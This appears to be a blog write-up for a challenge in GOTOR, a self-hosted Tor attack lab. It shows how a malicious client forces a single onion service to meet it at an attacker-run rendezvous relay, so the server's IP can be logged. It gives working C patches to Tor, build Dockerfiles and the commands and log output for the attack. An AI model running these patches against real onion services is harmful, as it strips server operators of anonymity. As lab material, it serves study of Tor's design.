---
title: "GOTOR -  Deanonymizing a Single Onion Service by Forcing the Rendezvous Point"
date: 2026-10-29 15:00:00 +0100
categories: [CTF, GOTOR]
tags: [tor, onion-service, single-onion-service, deanonymization, writeup]
media_subpath: /assets/img/
image:
  path: sos_setup.png
  alt: Single Onion Services can be handy — just not for privacy
---

## GOTOR

> This is a writeup for one of the attacks in **GOTOR**, a self-hosted lab for practising attacks against Tor. The lab is available [on GitHub](https://github.com/NiBi8z/GOTOR).
{: .prompt-tip }

For this challenge, we get the onion link from the CTF-board page. The goal is to recover the IP address of the server hosting this onion service.

The sentence *"Single Onion Services can be handy! Just not for privacy."* is a huge hint!

As described in [the Tor spec](https://spec.torproject.org/proposals/252-single-onion.html), a **single onion service** trades service-side location privacy for improved performance, reliability, and scalability.

## How the attack works

As a reminder, here is the classic flow of a connection between a client and an onion service. The client first fetches the **introduction points** of the onion service it wants to reach. The service keeps a permanent connection open to each of these introduction points.

The client then tells an introduction point: *"Hey, ask this `.onion` to meet me at this rendezvous point (RP) and to present this cookie."* The introduction point relays the message to the `.onion`.

The onion service then connects to the RP — still going through several hops (4 when Vanguards-lite is in use). It presents the requested cookie to the RP, which then links the client and the onion server together.

The RP never learns the IP of the `.onion`, because the service reaches it through a multi-hop circuit.

That design costs the service time, though: it talks to many clients at once and has to build a fresh circuit each time. This is why the **single onion service** option exists: the server connects *directly* to the RP, without going through a multi-hop circuit. You gain performance but you accept losing anonymity, because the RP now sees the real IP of the `.onion`. On top of that, **it is the client that chooses the RP** — so a malicious client can deliberately send the service to an RP it controls and read off its IP. That is exactly the goal of today's attack!

```
Default Behavior (vanguards-lite) :
  Service → Guard(L1) → L2 → Middle → RP        (4 hops)

Single Onion :
  Service ─────────────────────────────→ RP     (1 hop)
```


## Patching Tor

We are going to need a few things:

* **Send the `.onion` to an RP we control.** Tor chooses the RP itself, and there is no configuration option to force a specific one. We will therefore have to patch our Tor binary to pin the RP.

* **Log the IP of a server that connects to our malicious RP.** By default Tor does not log this, so we will generate a log entry whenever a server connects to our RP.

However, just because *a* server shows up at our RP does not prove it is the server our client is trying to reach. It could be a coincidence — another client may have asked another server to meet at the same RP. To be absolutely certain that the server connecting to our RP is doing so because of *our* client's fetch of the `.onion`, we will also patch our client's Tor so it uses a specific rendezvous cookie. The server will then present that specific cookie to the RP, and we will be **100% sure** it came from our client's connection.

The nice thing about Tor is that it contains *thousands* of functions with very precise responsibilities. Once you have identified the right function to modify, the fix usually fits in a few lines.

### Forcing the rendezvous point

To pin the RP, we modify the `choose_good_exit_server()` function in `src/core/or/circuitbuild.c`.

The RP of a client circuit is the "exit" of a `CIRCUIT_PURPOSE_C_ESTABLISH_REND` circuit, drawn at random by `router_choose_random_node()` inside `choose_good_exit_server()`. We replace it with the relay named in the `FORCE_RP` environment variable:

```c
case CIRCUIT_PURPOSE_C_ESTABLISH_REND:
  if (TO_CIRCUIT(circ)->purpose == CIRCUIT_PURPOSE_C_ESTABLISH_REND) {
    const char *gotor_rp = getenv("FORCE_RP");
    const node_t *gotor_n = gotor_rp ? node_get_by_nickname(gotor_rp, 0) : NULL;
    if (gotor_n) return gotor_n;
  }
  ...
```

We pass the nickname of our RP in the Tor network, and that is the one this client will use for its connections.

### Forcing the cookie

To force the cookie, we modify `hs_circ_send_establish_rendezvous()` (around line 1564). A **fixed** cookie would get **dropped by the service**: if a server notices it is being asked to present the same cookie repeatedly, it refuses to connect to the RP. So we use a **fixed prefix** + a **random suffix** → a **unique** cookie for every rendezvous, but still recognizable by its prefix on the RP side:

```c
/* Instead of crypto_rand(... cookie, HS_REND_COOKIE_LEN) */
memcpy(circ->hs_ident->rendezvous_cookie, "HELLO-THERE", 11);
crypto_rand((char *) circ->hs_ident->rendezvous_cookie + 11,
            HS_REND_COOKIE_LEN - 11);          /* 11 fixed + 9 random = 20 */
```

Every connection made by this client to a `.onion` will now carry a cookie starting with `HELLO-THERE`.

### Logging the IP on the RP (relay) — `src/feature/rend/rendmid.c`

We modify the `rend_mid_rendezvous()` function: this is the RP receiving the `RENDEZVOUS1` cell **from the service**. `circ->p_chan` is the channel toward the service. We match the **prefix** of the cookie and log the peer's address:

```c
static const char magic_prefix[] = "HELLO-THERE";
if (tor_memeq(request, magic_prefix, strlen(magic_prefix))) {   /* 11 bytes */
  log_warn(LD_REND, "GOTOR: magic rendezvous cookie %s presented on circuit %u; "
           "server -> address is %s.",
           hexid, (unsigned)circ->p_circ_id, channel_describe_peer(circ->p_chan));
}
```

This logs the IP of any connection presenting a cookie that starts with `HELLO-THERE`.

We now compile our modified Tor and run it on a client and on a relay.

To compile it easily, we use a small Dockerfile that builds our Tor:

```dockerfile
#   podman build -f builder.Dockerfile -t tor-cookie-patch ../tor
FROM debian:bookworm-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
      build-essential pkg-config \
      autoconf automake libtool git python3 \
      libevent-dev libssl-dev zlib1g-dev liblzma-dev libzstd-dev \
 && rm -rf /var/lib/apt/lists/*

WORKDIR /src
COPY . .
RUN git clean -xdf 2>/dev/null || true

RUN ./autogen.sh \
 && ./configure --disable-unittests --disable-asciidoc \
 && make -j"$(nproc)" src/app/tor
```

This simply produces an image containing our compiled, patched Tor.

To then use our patched Tor in a client or a relay, we use this Dockerfile:

```dockerfile
#  podman build -f Dockerfile -t goadtor/torcookie-patched:latest .
FROM debian:bookworm-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
      python3 python3-pip \
      curl netcat-openbsd iproute2 procps ca-certificates jq \
      libevent-2.1-7 libssl3 zlib1g liblzma5 libzstd1 \
 && rm -rf /var/lib/apt/lists/*

RUN pip3 install --break-system-packages --no-cache-dir stem requests pysocks

COPY --from=tor-cookie-patch /src/src/app/tor /usr/bin/tor

COPY scripts/ /scripts/
RUN chmod +x /scripts/*.sh

ENTRYPOINT ["/scripts/entrypoint.sh"]
```

Thanks to `COPY --from=tor-cookie-patch /src/src/app/tor /usr/bin/tor`, our patched Tor is baked into our relay.

We also need our client **not** to use Vanguards. Otherwise the length of the exit path no longer matches the requirements because of our patch (or we would have to write a more elaborate patch).

So we add `VanguardsLiteEnabled 0` to the client's `torrc` configuration file. Tor also keeps a pool of ready-to-use circuits by default; to make sure it only ever uses circuits with **our** RP as the exit, we disable automatic circuit building by adding `__DisablePredictedCircuits 1` to the client's configuration.

To keep things simple, we use the same Tor patch for both our client and our relay — that is more than enough for the lab.

We compile our patched Tor:

```bash
podman build -f badRelay/builder.Dockerfile -t tor-cookie-patch tor
....
Successfully tagged localhost/tor-cookie-patch:latest
```

We build our GOTOR image with the patched Tor:

```bash
➜  GOTOR git:(main) ✗ podman build -f attack/singleonionservice/badRelay/Dockerfile -t goadtor/torcookie-patched:latest .
...
Successfully tagged localhost/goadtor/torcookie-patched:latest
```

Starting our malicious RP:

```bash
podman run -d --name evilrp \
  --network gotor \
  -v evilrp_keys:/var/lib/tor-node \
  -v gotor_shared:/shared \
  -v "$PWD/torrc:/torrc:ro" \
  -e TOR_ROLE=relay -e TOR_NICK=evilrp \
  goadtor/torcookie-patched:latest

4326b7b496565603fb1b480f4dd35f6809070da0ee5f4625bfca5fc6450fbbb9
```

By default Tor scrubs IP addresses from its logs as a safety measure, so we need to enable IP logging on the Tor instance running our RP:

```bash
podman exec evilrp python3 -c \
  "from stem.control import Controller; c=Controller.from_port(address='127.0.0.1',port=9051); c.authenticate(); c.set_conf('SafeLogging','0'); c.close()"
```

Here we use the Python `stem` library, which lets us control part of our Tor process. We disable `SafeLogging` by setting it to `0`.

We start our client:

```bash
podman run -d --name evilclient \
  --network gotor \
  -v gotor_shared:/shared \
  -v "$PWD/torrc:/torrc:ro" \
  -e TOR_ROLE=client -e TOR_NICK=evilclient -e FORCE_RP=evilrp \
  goadtor/torcookie-patched:latest

89f8a7ff79ce85b2a1bce52e2464958c014bcb54fee501cff3090a02036983e1
```

We pass the `FORCE_RP` environment variable with the nickname of our malicious RP in the Tor network. That nickname is what our patch keys on to choose its RP.

Now we just wait 2–3 minutes for our RP relay to show up in the consensus. We can check this with `stem` once more:

```bash
podman exec -i client1 python3 -c "
from stem.control import Controller
with Controller.from_port(address='127.0.0.1', port=9051) as c:
    c.authenticate()
    for d in sorted(c.get_network_statuses(), key=lambda x: -x.bandwidth):
        print(f'{d.nickname:<14} bw={d.bandwidth:<7} flags={d.flags}')
"
Thu Oct 29 03:55:16 PM CET 2026
auth3          bw=394     flags=['Authority', 'Fast', 'Guard', 'HSDir', 'Running', 'Stable', 'V2Dir', 'Valid']
auth1          bw=235     flags=['Authority', 'Fast', 'Guard', 'HSDir', 'Running', 'Stable', 'V2Dir', 'Valid']
guard1         bw=100     flags=['Fast', 'Guard', 'HSDir', 'Running', 'Stable', 'V2Dir', 'Valid']
middle1        bw=95      flags=['Fast', 'HSDir', 'Running', 'Stable', 'V2Dir', 'Valid']
middle4        bw=74      flags=['Fast', 'HSDir', 'Running', 'Stable', 'V2Dir', 'Valid']
guard3         bw=67      flags=['Fast', 'Guard', 'HSDir', 'Running', 'Stable', 'V2Dir', 'Valid']
guard2         bw=67      flags=['Fast', 'Guard', 'HSDir', 'Running', 'Stable', 'V2Dir', 'Valid']
auth2          bw=56      flags=['Authority', 'Fast', 'HSDir', 'Running', 'Stable', 'V2Dir', 'Valid']
middle2        bw=54      flags=['Fast', 'HSDir', 'Running', 'Stable', 'V2Dir', 'Valid']
evilrp         bw=54      flags=['Fast', 'HSDir', 'Running', 'V2Dir', 'Valid']
middle5        bw=53      flags=['Fast', 'HSDir', 'Running', 'V2Dir', 'Valid']
middle3        bw=53      flags=['Fast', 'HSDir', 'Running', 'Stable', 'V2Dir', 'Valid']
```

Next, we enter the container running our patched Tor and make a request to the `.onion`!

```bash
➜  GOTOR git:(main) ✗ podman exec -it evilclient bash
root@89f8a7ff79ce:/# curl --socks5-hostname 127.0.0.1:9050 "6mmpccefpimke5cir7b4pv2rz3uhaptcudpvid3y53j2lloelx6cdnqd.onion"
<!doctype html>
<html lang="en"><head><meta charset="utf-8">
...
```

We got a response! Logically, the connection went through our malicious RP, which must have logged the connection along with its pseudo-random cookie.

Let's check:

```bash
➜  GOTOR git:(main) ✗ podman logs evilrp | grep "GOTOR: magic"

Oct 29 14:58:50.000 [warn] GOTOR: magic rendezvous cookie 48454C4C presented on circuit 3351358863; server -> address is 10.44.4.142:59954.
```

There it is! Our Tor received a cookie starting with `48454C4C` (`HELL` in hex) coming from the IP `10.44.4.142`. Since the server uses a single onion service, this is the server's real IP!

## Conclusion

A single onion service can still be useful — for instance for sites that do not need to stay anonymous but want to offer access in censored countries (press outlets, social networks, and so on). That said, keep in mind that it completely removes the service's anonymity just to gain a little performance.
